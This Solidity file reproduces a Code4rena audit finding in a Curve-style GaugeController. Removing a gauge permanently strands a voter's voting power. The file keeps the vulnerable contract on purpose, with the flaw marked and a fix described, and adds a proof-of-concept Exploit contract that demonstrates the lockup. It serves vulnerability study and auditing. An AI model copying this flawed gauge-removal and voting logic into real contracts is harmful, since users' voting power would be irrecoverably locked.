// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Canto (veRWA / mkt.market) — GaugeController: removing a gauge permanently
    strands a voter's voting power on it     (Code4rena 2023-08-verwa, #26976, H-08)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. GaugeController
    is a near-verbatim reduction of the audited contract (only the VotingEscrow
    dependency is replaced by a minimal configurable mock — the vulnerable
    control-flow is untouched). The Exploit deploys everything, votes 100% of its
    power onto gauge1, has governance remove gauge1, then shows the voter can
    neither move that power to gauge2 (blocked by the "Used too much power" cap)
    nor zero it out on the now-removed gauge (blocked by "Invalid gauge address")
    — no fork, no vm.warp, no cheats. Root cause: `remove_gauge` never resets the
    voter's `vote_user_slopes`/`vote_user_power` for the removed gauge, and
    `vote_for_gauge_weights` requires `isValidGauge[_gauge_addr]` even to submit a
    ZERO vote, so there is no way back once a gauge is removed.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Reduced VotingEscrow surface used by GaugeController.vote_for_gauge_weights.
///      Real VotingEscrow computes these from a user's locked veRWA/veCANTO
///      position; this mock lets the Exploit set them directly (irrelevant to
///      the bug, which lives entirely in GaugeController).
contract MockVotingEscrow {
    struct UserPoint {
        int128 bias;
        int128 slope;
        uint256 ts;
    }

    mapping(address => UserPoint) internal _points;
    mapping(address => uint256) internal _lockEnd;

    function setUser(address user, int128 slope, uint256 lockEnd_) external {
        _points[user] = UserPoint({bias: 0, slope: slope, ts: block.timestamp});
        _lockEnd[user] = lockEnd_;
    }

    function getLastUserPoint(address user) external view returns (int128 bias, int128 slope, uint256 ts) {
        UserPoint memory p = _points[user];
        return (p.bias, p.slope, p.ts);
    }

    function lockEnd(address user) external view returns (uint256) {
        return _lockEnd[user];
    }
}

/// @dev Minimal max() helper (real code uses OpenZeppelin's Math.max).
library Math {
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }
}

/// @title  GaugeController
/// @notice VERBATIM reduction of src/GaugeController.sol from the audited repo
///         (code-423n4/2023-08-verwa @ a693b4d), Curve-style vote-weighted gauge
///         controller. Only the VotingEscrow import is swapped for the minimal
///         mock above; every function body, state layout, and the vulnerable
///         control-flow are unchanged.
contract GaugeController {
    uint256 public constant WEEK = 7 days;
    uint256 public constant MULTIPLIER = 10 ** 18;

    event NewGauge(address indexed gauge_address);
    event GaugeRemoved(address indexed gauge_address);

    MockVotingEscrow public votingEscrow;
    address public governance;
    mapping(address => bool) public isValidGauge;
    mapping(address => mapping(address => VotedSlope)) public vote_user_slopes;
    mapping(address => uint256) public vote_user_power;
    mapping(address => mapping(address => uint256)) public last_user_vote;

    mapping(address => mapping(uint256 => Point)) public points_weight;
    mapping(address => mapping(uint256 => uint256)) public changes_weight;
    mapping(address => uint256) time_weight;

    mapping(uint256 => Point) points_sum;
    mapping(uint256 => uint256) changes_sum;
    uint256 public time_sum;

    struct Point {
        uint256 bias;
        uint256 slope;
    }

    struct VotedSlope {
        uint256 slope;
        uint256 power;
        uint256 end;
    }

    modifier onlyGovernance() {
        require(msg.sender == governance);
        _;
    }

    constructor(address _votingEscrow, address _governance) {
        votingEscrow = MockVotingEscrow(_votingEscrow);
        governance = _governance;
        uint256 last_epoch = (block.timestamp / WEEK) * WEEK;
        time_sum = last_epoch;
    }

    function _get_sum() internal returns (uint256) {
        uint256 t = time_sum;
        Point memory pt = points_sum[t];
        for (uint256 i; i < 500; ++i) {
            if (t > block.timestamp) break;
            t += WEEK;
            uint256 d_bias = pt.slope * WEEK;
            if (pt.bias > d_bias) {
                pt.bias -= d_bias;
                uint256 d_slope = changes_sum[t];
                pt.slope -= d_slope;
            } else {
                pt.bias = 0;
                pt.slope = 0;
            }
            points_sum[t] = pt;
            if (t > block.timestamp) time_sum = t;
        }
        return pt.bias;
    }

    function _get_weight(address _gauge_addr) private returns (uint256) {
        uint256 t = time_weight[_gauge_addr];
        if (t > 0) {
            Point memory pt = points_weight[_gauge_addr][t];
            for (uint256 i; i < 500; ++i) {
                if (t > block.timestamp) break;
                t += WEEK;
                uint256 d_bias = pt.slope * WEEK;
                if (pt.bias > d_bias) {
                    pt.bias -= d_bias;
                    uint256 d_slope = changes_weight[_gauge_addr][t];
                    pt.slope -= d_slope;
                } else {
                    pt.bias = 0;
                    pt.slope = 0;
                }
                points_weight[_gauge_addr][t] = pt;
                if (t > block.timestamp) time_weight[_gauge_addr] = t;
            }
            return pt.bias;
        } else {
            return 0;
        }
    }

    function add_gauge(address _gauge) external onlyGovernance {
        require(!isValidGauge[_gauge], "Gauge already exists");
        isValidGauge[_gauge] = true;
        emit NewGauge(_gauge);
    }

    /// @notice Remove a gauge, only callable by governance
    /// @dev Sets the gauge weight to 0. // @> VULN: does NOT reset any voter's
    ///      vote_user_slopes[voter][_gauge] / vote_user_power[voter] for this
    ///      gauge, so voting power allocated to a removed gauge is never freed.
    ///      FIX: either allow zero-weight votes on removed gauges (change the
    ///      require in vote_for_gauge_weights to `_user_weight == 0 ||
    ///      isValidGauge[_gauge_addr]`), or have remove_gauge itself walk/void
    ///      outstanding votes.
    function remove_gauge(address _gauge) external onlyGovernance {
        require(isValidGauge[_gauge], "Invalid gauge address");
        isValidGauge[_gauge] = false;
        _change_gauge_weight(_gauge, 0);
        emit GaugeRemoved(_gauge);
    }

    function checkpoint() external {
        _get_sum();
    }

    function checkpoint_gauge(address _gauge) external {
        _get_weight(_gauge);
        _get_sum();
    }

    function _gauge_relative_weight(address _gauge, uint256 _time) private view returns (uint256) {
        uint256 t = (_time / WEEK) * WEEK;
        uint256 total_weight = points_sum[t].bias;
        if (total_weight > 0) {
            uint256 gauge_weight = points_weight[_gauge][t].bias;
            return (MULTIPLIER * gauge_weight) / total_weight;
        } else {
            return 0;
        }
    }

    function gauge_relative_weight(address _gauge, uint256 _time) external view returns (uint256) {
        return _gauge_relative_weight(_gauge, _time);
    }

    function gauge_relative_weight_write(address _gauge, uint256 _time) external returns (uint256) {
        _get_weight(_gauge);
        _get_sum();
        return _gauge_relative_weight(_gauge, _time);
    }

    function _change_gauge_weight(address _gauge, uint256 _weight) internal {
        uint256 old_gauge_weight = _get_weight(_gauge);
        uint256 old_sum = _get_sum();
        uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;

        points_weight[_gauge][next_time].bias = _weight;
        time_weight[_gauge] = next_time;

        uint256 new_sum = old_sum + _weight - old_gauge_weight;
        points_sum[next_time].bias = new_sum;
        time_sum = next_time;
    }

    function change_gauge_weight(address _gauge, uint256 _weight) public onlyGovernance {
        _change_gauge_weight(_gauge, _weight);
    }

    /// @notice Allocate voting power for changing pool weights
    /// @dev `_gauge_addr` must be a currently-valid gauge — this is the OTHER
    ///      half of the bug: once a gauge is removed, NEITHER a nonzero vote NOR
    ///      a zero-weight (i.e. "give my power back") vote is possible for it.
    function vote_for_gauge_weights(address _gauge_addr, uint256 _user_weight) external {
        require(_user_weight >= 0 && _user_weight <= 10_000, "Invalid user weight");
        require(isValidGauge[_gauge_addr], "Invalid gauge address"); // @> VULN: blocks even a 0-weight "give my power back" vote once the gauge is removed
        MockVotingEscrow ve = votingEscrow;
        (, int128 slope_,) = ve.getLastUserPoint(msg.sender);
        require(slope_ >= 0, "Invalid slope");
        uint256 slope = uint256(uint128(slope_));
        uint256 lock_end = ve.lockEnd(msg.sender);
        uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;
        require(lock_end > next_time, "Lock expires too soon");
        VotedSlope memory old_slope = vote_user_slopes[msg.sender][_gauge_addr];
        uint256 old_dt = 0;
        if (old_slope.end > next_time) old_dt = old_slope.end - next_time;
        uint256 old_bias = old_slope.slope * old_dt;
        VotedSlope memory new_slope =
            VotedSlope({slope: (slope * _user_weight) / 10_000, end: lock_end, power: _user_weight});
        uint256 new_dt = lock_end - next_time;
        uint256 new_bias = new_slope.slope * new_dt;

        // Check and update powers (weights) used
        uint256 power_used = vote_user_power[msg.sender];
        power_used = power_used + new_slope.power - old_slope.power;
        require(power_used >= 0 && power_used <= 10_000, "Used too much power"); // @> VULN: old_slope.power for the removed gauge is still counted, so it can never be freed by voting elsewhere
        vote_user_power[msg.sender] = power_used;

        uint256 old_weight_bias = _get_weight(_gauge_addr);
        uint256 old_weight_slope = points_weight[_gauge_addr][next_time].slope;
        uint256 old_sum_bias = _get_sum();
        uint256 old_sum_slope = points_sum[next_time].slope;

        points_weight[_gauge_addr][next_time].bias = Math.max(old_weight_bias + new_bias, old_bias) - old_bias;
        points_sum[next_time].bias = Math.max(old_sum_bias + new_bias, old_bias) - old_bias;
        if (old_slope.end > next_time) {
            points_weight[_gauge_addr][next_time].slope =
                Math.max(old_weight_slope + new_slope.slope, old_slope.slope) - old_slope.slope;
            points_sum[next_time].slope = Math.max(old_sum_slope + new_slope.slope, old_slope.slope) - old_slope.slope;
        } else {
            points_weight[_gauge_addr][next_time].slope += new_slope.slope;
            points_sum[next_time].slope += new_slope.slope;
        }
        if (old_slope.end > block.timestamp) {
            changes_weight[_gauge_addr][old_slope.end] -= old_slope.slope;
            changes_sum[old_slope.end] -= old_slope.slope;
        }
        changes_weight[_gauge_addr][new_slope.end] += new_slope.slope;
        changes_sum[new_slope.end] += new_slope.slope;

        _get_sum();

        vote_user_slopes[msg.sender][_gauge_addr] = new_slope;
        last_user_vote[msg.sender][_gauge_addr] = block.timestamp;
    }

    function get_gauge_weight(address _gauge) external view returns (uint256) {
        return points_weight[_gauge][time_weight[_gauge]].bias;
    }

    function get_total_weight() external view returns (uint256) {
        return points_sum[time_sum].bias;
    }
}

/// @dev Orchestrator. Deploys the mock VotingEscrow + GaugeController (itself as
///      governance AND the sole voter, matching the finding's PoC where `gov`
///      plays both roles), votes 100% power onto gauge1, has governance remove
///      gauge1, then proves the stranded-power harm: neither redirecting to
///      gauge2 nor zeroing out gauge1 succeeds.
contract Exploit {
    MockVotingEscrow public ve; // CREATE nonce 1
    GaugeController public gc; // CREATE nonce 2

    address public constant GAUGE1 = address(0xA11CE0001);
    address public constant GAUGE2 = address(0xA11CE0002);

    constructor() {
        ve = new MockVotingEscrow(); // CREATE nonce 1
        gc = new GaugeController(address(ve), address(this)); // CREATE nonce 2

        // Give this contract (acting as both governance and the voter, exactly
        // like `gov` in the finding's PoC) a 5-year-long veRWA-style lock with a
        // positive slope, so vote_for_gauge_weights' preconditions are satisfied.
        ve.setUser(address(this), 1e15, block.timestamp + 1825 days);

        gc.add_gauge(GAUGE1);
        gc.change_gauge_weight(GAUGE1, 100);
        gc.add_gauge(GAUGE2);
        gc.change_gauge_weight(GAUGE2, 100);

        // All-in on gauge1.
        gc.vote_for_gauge_weights(GAUGE1, 10_000);
    }

    function run() external {
        require(gc.vote_user_power(address(this)) == 10_000, "baseline power wrong");

        // Governance removes gauge1 (e.g. it became faulty / illiquid / expired).
        gc.remove_gauge(GAUGE1);
        require(!gc.isValidGauge(GAUGE1), "gauge1 should be removed");

        // HARM, step 1: the voter cannot move its power to gauge2 — the removed
        // gauge's power is still counted against the 10_000 bps cap.
        (bool ok1,) =
            address(gc).call(abi.encodeWithSelector(GaugeController.vote_for_gauge_weights.selector, GAUGE2, 10_000));
        require(!ok1, "expected vote_for_gauge_weights(gauge2) to revert (power still stuck on gauge1)");

        // HARM, step 2: the voter cannot even zero out its vote on the removed
        // gauge to reclaim its power — vote_for_gauge_weights requires the gauge
        // to still be valid, even for a 0 weight.
        (bool ok2,) =
            address(gc).call(abi.encodeWithSelector(GaugeController.vote_for_gauge_weights.selector, GAUGE1, 0));
        require(!ok2, "expected vote_for_gauge_weights(gauge1, 0) to revert (Invalid gauge address)");

        // The voter's power is permanently and irrecoverably stranded.
        require(gc.vote_user_power(address(this)) == 10_000, "power should still show as fully (and forever) used");
    }
}
